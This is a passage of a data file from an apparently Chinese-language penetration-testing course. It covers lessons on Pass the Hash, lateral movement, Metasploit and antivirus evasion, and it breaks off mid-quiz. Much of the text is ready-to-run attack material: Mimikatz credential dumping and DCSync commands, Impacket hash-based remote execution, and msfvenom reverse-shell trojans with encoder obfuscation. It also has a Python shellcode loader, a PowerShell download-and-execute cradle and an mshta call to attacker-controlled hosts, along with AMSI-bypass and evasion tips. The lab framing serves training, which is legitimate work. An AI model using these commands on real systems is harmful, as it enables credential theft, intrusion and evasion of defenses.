    labEnvironment: [{ name: 'AD Pentest Lab', description: '搭建内网域环境练习', url: 'https://github.com/Orange-Cyberdefense/GOAD', type: 'local', setup: '1. 使用VirtualBox搭建以下虚拟机:\n   - Windows Server 2016 作为域控制器 (DC)\n   - Windows 10 作为域内主机\n   - Kali Linux 作为攻击机\n2. 配置域: pentest.lab\n3. 创建域用户和域管理员\n4. 配置网络使攻击机能访问域内主机\n5. 开始内网渗透练习', expectedOutput: '掌握域环境信息收集，能定位域控制器和枚举域用户' }],
    recommendedTools: [{ name: 'CrackMapExec', description: '内网批量扫描工具', url: 'https://github.com/byt3bl33k3r/CrackMapExec', type: 'local' }, { name: 'BloodHound', description: '域内关系分析工具', url: 'https://github.com/BloodHoundAD/BloodHound', type: 'local' }, { name: ' Impacket', description: '内网渗透工具集', url: 'https://github.com/SecureAuthCorp/impacket', type: 'local' }],
    quiz: [
      { type: 'single', question: '以下哪个命令可以查看域用户列表？', options: ['A. net user /domain', 'B. net view /domain', 'C. net config', 'D. netstat -an'], correctIndex: 0, explanation: 'net user /domain显示域环境中的所有用户账户。' },
      { type: 'single', question: '如何定位域控制器？', options: ['A. ping domain.com', 'B. nslookup -type=srv _kerberos._tcp', 'C. netstat -an', 'D. tracert'], correctIndex: 1, explanation: 'DNS SRV记录指向域控制器，nslookup查询_kerberos._tcp服务记录可定位DC。' },
      { type: 'boolean', question: 'Workgroup环境中所有计算机由域控制器统一管理。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'Workgroup是分散式管理，每台机器独立；只有Active Directory域环境才由DC统一管理。' },
      { type: 'fill', question: '______协议是Windows域环境的默认认证协议，使用票据机制。', correctAnswer: 'Kerberos', explanation: 'Kerberos是域环境默认认证协议，通过票据(TGT/ST)实现安全认证。' },
      { type: 'multiple', question: '以下哪些是域环境核心组件？（多选）', options: ['A. Domain Controller', 'B. LDAP', 'C. FTP', 'D. DNS'], correctIndices: [0, 1, 3], explanation: '域环境核心组件包括DC(域控制器)、LDAP(目录服务)、DNS(名称解析)，FTP不是域组件。' },
      { type: 'single', question: 'CrackMapExec主要用于什么场景？', options: ['A. Web漏洞扫描', 'B. 内网批量安全检测', 'C. 密码破解', 'D. 无线网络扫描'], correctIndex: 1, explanation: 'CrackMapExec是内网批量安全检测工具，支持批量SMB、WinRM等协议的安全检测。' }
    ],
    expertNotes: [
      { author: '域安全研究员', title: '内网渗透入门', content: '内网渗透的核心是信息收集。先用net命令了解域环境结构，再用CrackMapExec批量扫描。BloodHound能可视化域内关系，发现最短攻击路径。', url: 'https:// posts.specterops.io/' },
      { author: '红队老兵', title: '域控制器定位技巧', content: '定位DC的多种方法：nslookup查SRV记录、net time同步时间、echo %logonserver%、nltest /dclist。多种方法交叉验证更可靠。', url: 'https://www.thehacker.recipes/' },
      { author: '内网渗透专家', title: '内网扫描策略', content: '内网扫描要谨慎，避免触发告警。先用Ping扫描快速发现存活主机，再针对SMB、RDP等端口详细扫描。使用--deadly参数让CrackMapExec自动攻击。' }
    ],
    environmentSetup: {
      prerequisites: ['VirtualBox或VMware', 'Windows Server 2016镜像', 'Windows 10镜像', 'Kali Linux攻击机'],
      verificationSteps: ['1. 搭建域环境并配置pentest.lab域', '2. 创建域用户和域管账户', '3. 配置网络使各机器互通', '4. 验证DNS解析正常', '5. 开始内网信息收集练习']
    }
  ,
      resources: [{"name": "内网渗透完全指南", "url": "https://www.freebuf.com/articles/es/278934.html", "type": "article"}, {"name": "域渗透基础入门", "url": "https://attack.mitre.org/matrices/enterprise/", "type": "article"}, {"name": "内网信息收集技术", "url": "https://www.anquanke.com/post/id/267890", "type": "article"}, {"name": "BloodHound使用指南", "url": "https://github.com/BloodHoundAD/BloodHound", "type": "article"}]},
  { 
    id: 'pen-23', 
    day: 23, 
    title: 'Pass The Hash', 
    subtitle: 'Pass The Hash Attack', 
    objectives: ['理解PTH攻击原理', '掌握Mimikatz利用', '学会Impacket工具', '了解防御措施'], 
    content: `Pass The Hash（PTH）攻击允许攻击者使用密码哈希值而非明文密码进行认证，是内网渗透中的核心技术。

【认证原理】
Windows使用NTLM协议进行网络认证，过程中会传递密码的哈希值。攻击者获取到NTLM哈希后，可以构造认证请求，实现" Pass The Hash"。

【利用条件】
• 需要目标机器的本地管理员权限或同等权限
• 目标机器存在相同密码的账户
• 可以访问目标机器的SMB、RPC等服务端口

【Mimikatz核心命令】
• privilege::debug - 提升到debug权限（必须先执行）
• sekurlsa::logonpasswords - 读取登录用户凭据（明文密码和哈希）
• sekurlsa::pth /user:administrator /ntlm:hash - 执行PTH攻击
• lsadump::sam - 读取本地SAM数据库获取哈希
• lsadump::dcsync /domain:domain /user:username - 从DC同步用户哈希
• sekurlsa::tickets - 列出当前会话票据

【Impacket工具集】
• psexec.py domain/user@target - 使用哈希连接（需要-hashes参数）
• wmiexec.py domain/user@target - WMI远程执行（隐蔽）
• smbexec.py domain/user@target - SMB远程执行
• atexec.py domain/user@target - 计划任务远程执行
• dcomexec.py domain/user@target - DCOM远程执行

【利用示例】
# Mimikatz执行PTH
privilege::debug
sekurlsa::pth /user:Administrator /ntlm:lm:ntlm /domain:targetdomain

# Impacket psexec
psexec.py -hashes :ntlmhash domain/user@targetip cmd.exe

# Impacket wmiexec（更隐蔽）
wmiexec.py -hashes :ntlmhash domain/user@targetip

【防御措施】
• 启用Credential Guard保护凭据
• 禁用LM哈希（使用NTLMv2）
• 限制管理员登录范围（加入Protected Users组）
• 启用多点登录审计
• 限制远程RPC/SMB访问
• 定期轮换管理员密码

【检测PTH攻击】
• 监控异常的高权限账户网络登录
• 检测同一哈希从多台机器登录
• 启用Windows事件日志4624、4625记录登录类型`, 
    keyPoints: ['PTH用哈希代替密码认证', 'Mimikatz是PTH神器', 'privilege::debug必须先执行', 'Impacket提供多种PTH工具', 'Credential Guard可防御PTH'],
    codeExamples: [{ title: 'Mimikatz批量PTH脚本', language: 'bash', code: `# Mimikatz PTH攻击示例\n\n# 1. 读取本地凭据\nmimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\n\n# 2. 导出SAM数据库\nlsadump::sam\n\n# 3. 执行PTH攻击\nsekurlsa::pth /user:Administrator /ntlm:ntlmhash /domain:targetdomain\n\n# 4. 使用psexec连接\npsexec.exe \\\\target cmd.exe\n\n# Impacket批量利用\n# 批量检测SMB哈希\ncrackmapexec smb 192.168.1.0/24 -u administrator -H ntlmhash\n\n# 批量远程执行\nwmiexec.py -hashes :ntlmhash domain/user@target \"whoami\"`, explanation: 'Mimikatz和Impacket的PTH利用方法' }],
    labEnvironment: [{ name: 'PTH攻击实验', description: '在域环境练习PTH攻击', url: 'https://github.com/gentilkiwi/mimikatz', type: 'local', setup: '1. 在Kali上安装Mimikatz: wget https://github.com/gentilkiwi/mimikatz/releases\n2. 安装Impacket: pip install impacket\n3. 在Windows靶机获取NTLM哈希\n4. 使用Mimikatz执行sekurlsa::logonpasswords\n5. 练习使用不同工具进行PTH攻击\n6. 使用CrackMapExec批量测试内网', expectedOutput: '掌握PTH攻击原理和工具使用，能成功横向移动' }],
    recommendedTools: [{ name: 'Mimikatz', description: '凭据窃取和PTH工具', url: 'https://github.com/gentilkiwi/mimikatz', type: 'local' }, { name: 'Impacket', description: '内网渗透工具集', url: 'https://github.com/SecureAuthCorp/impacket', type: 'local' }, { name: 'CrackMapExec', description: '内网批量利用工具', url: 'https://github.com/byt3bl33k3r/CrackMapExec', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Mimikatz中哪个命令可以读取登录凭据？', options: ['A. lsadump::sam', 'B. sekurlsa::logonpasswords', 'C. privilege::debug', 'D. sekurlsa::tickets'], correctIndex: 1, explanation: 'sekurlsa::logonpasswords读取当前系统中登录用户的凭据，包括明文密码和哈希值。' },
      { type: 'single', question: 'PTH攻击需要什么前提条件？', options: ['A. 明文密码', 'B. 本地管理员权限', 'C. 域用户权限', 'D. 普通用户权限'], correctIndex: 1, explanation: '执行PTH攻击通常需要目标机器的本地管理员权限或debug权限来读取凭据。' },
      { type: 'boolean', question: 'Mimikatz的privilege::debug命令必须在读取凭据之前执行。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: 'privilege::debug提升到debug权限是读取其他用户凭据的前提，否则会失败。' },
      { type: 'fill', question: '______是Windows的凭据保护机制，可防止Mimikatz读取凭据。', correctAnswer: 'Credential Guard', explanation: 'Credential Guard使用虚拟化技术隔离凭据，Mimikatz无法读取受保护的凭据。' },
      { type: 'multiple', question: '以下哪些是Impacket工具？（多选）', options: ['A. psexec.py', 'B. wmiexec.py', 'C. mimikatz.exe', 'D. smbexec.py'], correctIndices: [0, 1, 3], explanation: 'psexec.py、wmiexec.py、smbexec.py都是Impacket工具，Mimikatz是独立的凭据工具。' },
      { type: 'single', question: 'Impacket中哪个工具最隐蔽？', options: ['A. psexec.py', 'B. smbexec.py', 'C. wmiexec.py', 'D. atexec.py'], correctIndex: 2, explanation: 'wmiexec.py通过WMI远程执行，只使用SMB的135和445端口的WMI服务，最隐蔽。' }
    ],
    expertNotes: [
      { author: 'Mimikatz作者', title: 'Mimikatz使用指南', content: 'Mimikatz功能强大但也是双刃剑。使用sekurlsa::logonpasswords读取当前登录用户，lsadump::dcsync从DC同步任意用户哈希（需域管权限）。', url: 'https://github.com/gentilkiwi/mimikatz' },
      { author: '红队攻击专家', title: 'PTH实战技巧', content: '实战中先用CrackMapExec的--local-auth测试本地哈希，再横向扩散。获取到域管哈希后，用dcsync直接导出所有域用户哈希。', url: 'https://www.hackingarticles.in/' },
      { author: '安全架构师', title: 'PTH防御方案', content: '防御PTH攻击的核心是隔离和轮换：启用Credential Guard、将管理员加入Protected Users组、限制管理员登录范围、定期更换密码、启用多点认证。' }
    ],
    environmentSetup: {
      prerequisites: ['Mimikatz已安装', 'Impacket已安装', 'Windows靶机', '具有相同密码的账户'],
      verificationSteps: ['1. 在Windows靶机以管理员权限运行Mimikatz', '2. 执行privilege::debug', '3. 执行sekurlsa::logonpasswords获取哈希', '4. 使用Impacket工具进行PTH横向移动', '5. 验证成功获取目标shell']
    }
  ,
      resources: [{"name": "Pass The Hash详解", "url": "https://www.ired.team/offensive-security/credential-access-and-credential-dumping/", "type": "article"}, {"name": "NTLM认证机制分析", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}, {"name": "哈希传递攻击系列", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "Kerberos攻击技术", "url": "https://www.freebuf.com/articles/system/298023.html", "type": "article"}]},
  { 
    id: 'pen-24', 
    day: 24, 
    title: '横向移动', 
    subtitle: 'Lateral Movement', 
    objectives: ['掌握WMI横向技术', '学习计划任务横向', '掌握服务利用方法', '了解RDP横向'], 
    content: `横向移动是渗透测试中从一台主机渗透到另一台主机的核心技术，允许攻击者在内网中扩展控制范围。

【WMI横向移动】
• WMI（Windows Management Instrumentation）是Windows管理接口
• 支持远程执行命令，无需SMB端口
• 仅需135端口（WMI服务端口）

【WMI远程执行命令】
• wmic /node:target process call create "calc.exe" - 创建进程
• Invoke-WmiMethod -Namespace "root\\cimv2" -Class Win32_Process -Name Create -ArgumentList "calc.exe" -PowerShell远程执行
• wmic /node:@hosts.txt process call create "cmd.exe /c calc" - 批量执行

【计划任务横向移动】
• schtasks /create /s target /tn taskname /tr "cmd.exe /c calc" /sc once /st 00:00 - 创建计划任务
• schtasks /run /s target /tn taskname - 立即运行任务
• schtasks /delete /s target /tn taskname - 删除任务

【PsExec横向移动】
• psexec.exe \\\\target cmd.exe - 获取交互式shell
• psexec.exe \\\\target -c malicious.exe - 复制并执行程序
• psexec.exe \\\\target -u user -p password cmd.exe - 使用明文密码

【服务利用横向】
• sc \\\\target create shell binpath= "cmd.exe /c calc" - 创建服务
• sc \\\\target start shell - 启动服务
• sc \\\\target delete shell - 删除服务

【RDP横向移动】
• xfreerdp /u:user /p:pass /v:target - 远程桌面连接
• rdesktop -u user -p pass target - Linux RDP客户端
• tscon target /dest:console - 劫持RDP会话（需SYSTEM权限）

【DCOM横向移动】
• $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
• $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc","")

【Pass The Ticket横向】
• 利用Kerberos票据进行横向移动
• kirbi2ccache.py转换票据格式
• export KRB5CCNAME=ticket.ccache使用票据

【横向移动检测规避】
• 使用WMImplant等工具留下更少日志
• 避免使用PsExec产生的大量日志
• 利用已有服务账户的服务账户权限
• 尽量使用内存执行而非磁盘写入`, 
    keyPoints: ['WMI只需135端口即可横向', '计划任务可定时执行代码', 'PsExec是最经典的横向工具', 'RDP需要有效凭据', 'DCOM可绕过某些防火墙'],
    codeExamples: [{ title: '横向移动脚本', language: 'python', code: `import subprocess\n\ndef wmi lateral(target, command):\n    \"\"\"WMI远程执行\"\"\"\n    cmd = f'wmic /node:{target} process call create \"{command}\"'\n    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n    return result.stdout\n\ndef psexec_lateral(target, payload, user=\"\", password=\"\"):\n    \"\"\"PsExec远程执行\"\"\"\n    if user and password:\n        cmd = f'psexec.exe \\\\\\\\{target} -u {user} -p {password} {payload}'\n    else:\n        cmd = f'psexec.exe \\\\\\\\{target} {payload}'\n    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n    return result.stdout\n\ndef schtasks_lateral(target, taskname, command):\n    \"\"\"计划任务横向\"\"\"\n    # 创建任务\n    create_cmd = f'schtasks /create /s {target} /tn {taskname} /tr \"{command}\" /sc once /st 00:00 /f'\n    subprocess.run(create_cmd, shell=True)\n    # 运行任务\n    run_cmd = f'schtasks /run /s {target} /tn {taskname}'\n    result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True)\n    return result.stdout\n\n# Impacket示例\n# wmiexec.py domain/user@target \"whoami\"\n# psexec.py domain/user@target \"cmd.exe\"\n# smbexec.py domain/user@target`, explanation: '横向移动的常用方法和脚本' }],
    labEnvironment: [{ name: '横向移动实验', description: '在内网环境练习横向移动', url: 'https://www.vulnhub.com/', type: 'local', setup: '1. 搭建多台Windows靶机组成的内网环境\n2. 确保各机器网络互通\n3. 获取第一台主机的管理员权限\n4. 使用不同横向移动技术渗透其他主机\n5. 观察各技术产生的日志和痕迹\n6. 总结各技术的优缺点', expectedOutput: '掌握各种横向移动技术，能成功渗透内网多台主机' }],
    recommendedTools: [{ name: 'Impacket', description: '横向移动工具集', url: 'https://github.com/SecureAuthCorp/impacket', type: 'local' }, { name: 'PowerSploit', description: 'PowerShell渗透框架', url: 'https://github.com/PowerShellMafia/PowerSploit', type: 'local' }, { name: 'WMImplant', description: 'WMI横向工具', url: 'https://github.com/FortyNorthSecurity/WMImplant', type: 'local' }],
    quiz: [
      { type: 'single', question: 'WMI横向移动需要开放哪个端口？', options: ['A. 445', 'B. 135', 'C. 3389', 'D. 139'], correctIndex: 1, explanation: 'WMI服务使用135端口进行通信，不需要445端口，比PsExec更隐蔽。' },
      { type: 'single', question: 'PsExec.exe属于哪种横向移动技术？', options: ['A. WMI利用', 'B. 服务利用', 'C. 计划任务', 'D. RDP利用'], correctIndex: 1, explanation: 'PsExec通过创建和启动服务来远程执行命令，属于服务利用技术。' },
      { type: 'boolean', question: '横向移动必须获取目标主机的管理员权限。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '横向移动也可以利用普通用户权限，如通过服务账户、已泄露的普通用户凭据等进行横向。' },
      { type: 'fill', question: '使用RDP进行横向移动时，______命令可以劫持其他用户的RDP会话。', correctAnswer: 'tscon', explanation: 'tscon命令可以重定向RDP会话，在SYSTEM权限下可劫持其他用户的RDP会话。' },
      { type: 'multiple', question: '以下哪些是横向移动技术？（多选）', options: ['A. WMI', 'B. 计划任务', 'C. 缓冲区溢出', 'D. PsExec'], correctIndices: [0, 1, 3], explanation: 'WMI、计划任务、PsExec都是横向移动技术，缓冲区溢出是漏洞利用技术。' },
      { type: 'single', question: '哪种横向移动技术最隐蔽？', options: ['A. PsExec', 'B. RDP', 'C. WMI', 'D. 服务创建'], correctIndex: 2, explanation: 'WMI只使用135端口，不创建新服务或服务账户，比PsExec和服务创建更隐蔽。' }
    ],
    expertNotes: [
      { author: '内网渗透专家', title: '横向移动实战', content: '横向移动的精髓是选择最合适的技术：WMI最隐蔽但功能有限，PsExec功能强大但日志多。根据目标环境和检测能力灵活选择。', url: 'https://www.hackingarticles.in/' },
      { author: '红队攻击手', title: 'Pass The Ticket详解', content: 'Kerberoasting获取服务票据后，可以利用票据进行横向。票据有效期长，可复用。kirbi2ccache.py可转换票据格式供不同工具使用。', url: 'https://www.thehacker.recipes/' },
      { author: '安全研究员', title: '横向移动检测', content: '检测横向移动要看多个维度：异常账户登录、新服务创建、计划任务创建、WMI远程调用等。启用Windows安全事件审计4768、4769、4672等。' }
    ],
    environmentSetup: {
      prerequisites: ['至少3台Windows靶机', 'Impacket工具集', 'Mimikatz', '网络互通'],
      verificationSteps: ['1. 获取第一台主机管理员权限', '2. 使用Mimikatz导出哈希', '3. 使用WMI横向到第二台主机', '4. 使用PsExec横向到第三台主机', '5. 观察各技术产生的日志']
    }
  ,
      resources: [{"name": "横向移动技术完全指南", "url": "https://attack.mitre.org/tactics/TA0008/", "type": "article"}, {"name": "PsExec攻击技术", "url": "https://www.freebuf.com/articles/system/278901.html", "type": "article"}, {"name": "WMI远程执行", "url": "https://www.anquanke.com/post/id/298023", "type": "article"}, {"name": "RDP劫持与利用", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}]},
  { 
    id: 'pen-25', 
    day: 25, 
    title: 'Metasploit高级用法', 
    subtitle: 'Metasploit Advanced', 
    objectives: ['掌握Meterpreter进阶', '学会路由与代理配置', '掌握后渗透模块', '学习MSFVenom高级用法'], 
    content: `Metasploit Framework是强大的渗透测试框架，Meterpreter是其后渗透阶段的明星payload。

【Meterpreter进阶命令】
• sysinfo - 获取系统信息
• getuid - 获取当前用户
• getpid - 获取当前进程ID
• getprivs - 获取当前用户权限
• ipconfig / ifconfig - 查看网络配置
• route - 查看和修改路由表
• portfwd add -l 33389 -r target -p 3389 - 端口转发
• keyscan_start / keyscan_dump - 键盘记录
• screenshot / webcam_snap - 截图和摄像头

【进程迁移与注入】
• migrate PID - 迁移到指定进程（推荐explorer.exe、 spoolsv.exe）
• migrate -N explorer.exe - 迁移到新进程
• run post/windows/manage/migrate - 自动迁移
• keyscan_start迁移到lsass.exe可获取更多密码

【哈希与凭据】
• hashdump - 导出SAM数据库哈希
• run post/windows/gather/smart_hashdump - 更全面的哈希导出
• load kiwi - 加载Mimikatz模块
• creds all - 查看所有凭据

【路由与代理】
• run get_local_subnets - 获取本地子网
• route add 192.168.2.0 255.255.255.0 1 - 添加路由
• route add 192.168.2.0 255.255.255.0 -1 - 删除路由
• use auxiliary/server/socks4a - 启动SOCKS4A代理
• setg PROXYsock4a 127.0.0.1 1080 - 全局设置代理

【后渗透模块】
• run post/windows/gather/enum_logged_on_users - 枚举登录用户
• run post/windows/gather/enum_shares - 枚举共享
• run post/windows/gather/credential_collector - 收集凭据
• run post/multi/recon/local_exploit_suggester - 本地提权建议
• run post/windows/manage/delete_user USERNAME=xxx - 删除用户

【MSFVenom高级用法】
# 基本木马生成
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# 编码混淆
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 绑定型木马
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=IP LPORT=4444 -f exe -o bind.exe

# 进程注入
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 -x calc.exe -k -o shell.exe

# Linux木马
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# Web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

【模块开发基础】
• 路径：/usr/share/metasploit-framework/modules/
• 模块类型：exploit、auxiliary、post、payload、encoder、nop
• 参考现有模块编写自定义模块`, 
    keyPoints: ['Meterpreter是功能强大的后渗透shell', 'migrate迁移进程躲避检测', 'portfwd做端口转发', 'run运行后渗透模块', 'MSFVenom生成各种平台木马'],
    codeExamples: [{ title: 'Metasploit渗透脚本', language: 'bash', code: `# Metasploit 使用示例\n\n# 1. 启动MSF\nmsfconsole\n\n# 2. 搜索模块\nsearch type:exploit name:smb\n\n# 3. 使用模块\nexploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nset LPORT 4444\nexploit -j\n\n# 4. handler监听\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit -j\n\n# 5. Meterpreter后渗透\nsysinfo\ngetuid\nmigrate PID\nhashdump\nkeyscan_start\nkeyscan_dump\nscreenshot\nwebcam_snap\n\n# 6. 端口转发\nportfwd add -l 33389 -r 192.168.1.100 -p 3389\n# 访问本机33389端口即访问目标3389\n\n# 7. 添加路由\nrun get_local_subnets\nroute add 192.168.2.0 255.255.255.0 1\n# 之后即可直接访问192.168.2.0/24网段`, explanation: 'Metasploit和Meterpreter完整使用流程' }],
    labEnvironment: [{ name: 'Metasploit渗透实验', description: '使用Metasploit进行渗透', url: 'https://www.metasploit.com/', type: 'local', setup: '1. 启动Kali Metasploit\n2. 搭建存在漏洞的Windows靶机\n3. 使用search查找相关exploit\n4. 配置exploit参数并利用\n5. 获取Meterpreter shell\n6. 练习后渗透模块\n7. 练习MSFVenom生成各种木马', expectedOutput: '掌握Metasploit高级用法，能进行完整的渗透测试' }],
    recommendedTools: [{ name: 'Metasploit Framework', description: '渗透测试框架', url: 'https://www.metasploit.com/', type: 'local' }, { name: 'MSFVenom', description: '木马生成工具', url: 'https://www.metasploit.com/', type: 'local' }, { name: 'Meterpreter', description: '后渗透shell', url: 'https://www.metasploit.com/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Meterpreter中哪个命令可以迁移进程？', options: ['A. getpid', 'B. migrate', 'C. getprivs', 'D. sysinfo'], correctIndex: 1, explanation: 'migrate命令将Meterpreter会话迁移到其他进程，可躲避原进程被关闭或检测。' },
      { type: 'single', question: 'MSFVenom中-e参数的作用？', options: ['A. 指定payload', 'B. 指定编码器', 'C. 指定输出格式', 'D. 指定平台'], correctIndex: 1, explanation: '-e参数指定编码器，用于混淆payload躲避杀软检测。' },
      { type: 'boolean', question: 'Meterpreter的hashdump可以获取所有用户的明文密码。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'hashdump获取的是密码哈希值（如NTLM），不是明文。要获取明文密码需要Mimikatz配合lsass进程迁移。' },
      { type: 'fill', question: 'portfwd命令用于做______转发，将本机端口流量转发到远程目标。', correctAnswer: '端口', explanation: 'portfwd做端口转发，将本机端口流量转发到远程目标机器的指定端口。' },
      { type: 'multiple', question: '以下哪些是Meterpreter后渗透模块？（多选）', options: ['A. enum_logged_on_users', 'B. enum_shares', 'C. smart_hashdump', 'D. ms17_010_psexec'], correctIndices: [0, 1, 2], explanation: 'enum_logged_on_users、enum_shares、smart_hashdump都是后渗透模块，ms17_010_psexec是exploit模块。' },
      { type: 'single', question: 'MSFVenom生成Linux木马的-f参数值是？', options: ['A. exe', 'B. elf', 'C. dll', 'D. raw'], correctIndex: 1, explanation: 'Linux可执行文件格式是ELF，-f elf生成Linux木马；-f exe生成Windows木马。' }
    ],
    expertNotes: [
      { author: 'Metasploit贡献者', title: 'Meterpreter进阶技巧', content: 'Meterpreter的migrate非常重要，建议迁移到explorer.exe或spoolsv.exe等常见进程。load kiwi可以加载Mimikatz功能，获取明文密码。', url: 'https://www.metasploit.com/' },
      { author: '渗透测试工程师', title: 'MSFVenom免杀技巧', content: '单一编码容易被杀软检测。建议多次编码混合使用，或使用自定义模板绑定。分离payload和loader也是常用手法。', url: 'https://www.offensive-security.com/' },
      { author: '红队专家', title: '路由与代理配置', content: '添加路由后，Metasploit可以直接扫描内网。配合proxychains，可以让其他工具如Nmap通过Meterpreter会话代理扫描内网。' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux with Metasploit', 'Windows靶机', '网络互通'],
      verificationSteps: ['1. 启动msfconsole', '2. 生成木马并获取shell', '3. 练习Meterpreter命令', '4. 练习后渗透模块', '5. 配置路由扫描内网']
    }
  ,
      resources: [{"name": "Metasploit完全手册", "url": "https://docs.metasploit.com/", "type": "article"}, {"name": "MSF模块开发指南", "url": "https://www.freebuf.com/articles/web/289012.html", "type": "article"}, {"name": "Metasploit高级利用", "url": "https://www.offensive-security.com/metasploit-unleashed/", "type": "article"}, {"name": "Meterpreter后渗透", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}]},
  { 
    id: 'pen-26', 
    day: 26, 
    title: '免杀技术基础', 
    subtitle: 'Antivirus Evasion', 
    objectives: ['理解杀软检测原理', '掌握编码混淆技术', '学习分离加载技术', '了解行为检测规避'], 
    content: `免杀技术（AV Evasion）是绕过杀毒软件检测的技术，是红队攻击的重要技能。

【杀毒软件检测方式】
• 特征码检测：扫描文件中的已知恶意代码特征
• 行为检测：监控程序运行时的可疑行为
• 启发式检测：根据代码结构判断是否恶意
• 云查杀：上传样本到云端分析
• 内存扫描：检查进程内存中的恶意代码

【编码与混淆】
• MSF编码器：msfvenom -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
• 多重编码：msfvenom -e x86/shikata_ga_nai -i 3 -e cmd/powershell_base64 -i 2 ...
• 自定义混淆：手动修改shellcode字符

【加壳技术】
• UPX加壳：upx -9 shell.exe 压缩壳
• 自定义壳：编写加壳程序加密原始shellcode
• 壳在执行时解密并加载到内存

【分离加载（Shellcode Launcher）】
• 将shellcode与loader分离
• loader从文件、网络、注册表等位置读取shellcode
• 直接使用VirtualAlloc + CreateThread执行

【PowerShell免杀】
• Invoke-Expression远程加载
•混淆：$x = '64, 105...'; (New-Object IO.Text.Encoding...).GetString([byte[]]($x -split','))
• UnmanagedPowerShell执行
• AMSI绕过：修改AMSI相关注册表或内存

【Rundll32免杀】
• rundll32.exe javascript:"\..\mshtml,RunHTMLApplication" alert("test")
• InlineExecuteNtCreateSection执行shellcode

【mshta免杀】
• mshta.exe http://attacker.com/evil.hta
• JScript/VBScript执行shellcode

【工具化免杀】
• Veil-Framework：veil generate生成免杀载荷
• GreatSCT：生成Metasploit payloads
• Undetected.py：自动混淆木马
• Shellter：动态注入

【防御检测规避】
• 避免可疑API：VirtualAlloc + CreateThread组合被监控
• 混淆字符串：使用Char()、Concatenation等
• 进程注入：migrate到其他进程
• 时间延迟：sleep等待分析完成

【实战建议】
• 先静态后动态：先过特征码检测
• 多工具验证：VT查杀率检测
• 分离加载：最可靠的免杀方式
• 行为规避：才是最难的`, 
    keyPoints: ['杀软用特征码和行为检测', '编码器可改变文件特征', '分离加载最可靠', 'PowerShell是天然免杀平台', '行为检测比特征码难绕过'],
    codeExamples: [{ title: '免杀加载器示例', language: 'python', code: `# 简单的Python加载器示例\nimport ctypes\n\n# 原始shellcode（替换为实际shellcode）\nshellcode = bytes.fromhex(\"90\" * 100)  # NOP sled as placeholder\n\n# 分配可执行内存\nptr = ctypes.windll.kernel32.VirtualAlloc(\n    ctypes.c_void_p(None),\n    len(shellcode),\n    0x3000,  # MEM_COMMIT | MEM_RESERVE\n    0x40     # PAGE_EXECUTE_READWRITE\n)\n\n# 复制shellcode到内存\nctypes.windll.kernel32.RtlMoveMemory(\n    ctypes.c_void_p(ptr),\n    shellcode,\n    len(shellcode)\n)\n\n# 创建线程执行\nhandle = ctypes.windll.kernel32.CreateThread(\n    ctypes.c_void_p(None),\n    0,\n    ctypes.c_void_p(ptr),\n    ctypes.c_void_p(None),\n    0,\n    ctypes.c_void_p(None)\n)\n\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\n# PowerShell远程加载示例\n# powershell -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://attacker/shellcode.ps1'))\"`, explanation: '免杀加载器原理和PowerShell远程加载' }],
    labEnvironment: [{ name: '免杀技术实验', description: '使用VT测试免杀效果', url: 'https://www.virustotal.com/', type: 'online', setup: '1. 安装Veil、GreatSCT等工具\n2. 生成MSFVenom编码木马\n3. 使用Python编写加载器\n4. PowerShell混淆练习\n5. 上传到VirusTotal检测查杀率\n6. 逐步优化直到免杀', expectedOutput: '掌握免杀原理和基本方法，能绕过主流杀软检测' }],
    recommendedTools: [{ name: 'Veil', description: '免杀载荷生成器', url: 'https://github.com/Veil-Framework/Veil', type: 'local' }, { name: 'GreatSCT', description: '免杀工具', url: 'https://github.com/GreatSCT/GreatSCT', type: 'local' }, { name: 'Shellter', description: '动态注入工具', url: 'https://www.shellterproject.com/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'MSF编码器主要绕过哪种检测？', options: ['A. 行为检测', 'B. 启发式检测', 'C. 特征码检测', 'D. 云查杀'], correctIndex: 2, explanation: 'MSF编码器改变文件的字节特征，绕过基于特征码的检测，但对行为检测效果有限。' },
      { type: 'single', question: '分离加载技术的优点？', options: ['A. 改变文件特征', 'B. 静态文件无恶意代码', 'C. 改变行为特征', 'D. 混淆网络流量'], correctIndex: 1, explanation: '分离加载将shellcode与loader分开，静态文件扫描时无法检测到恶意代码。' },
      { type: 'boolean', question: '加壳后的程序运行时会解密并在内存中执行原始代码。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: '壳程序在程序启动时解密原始代码并加载到内存执行，这是壳的基本原理。' },
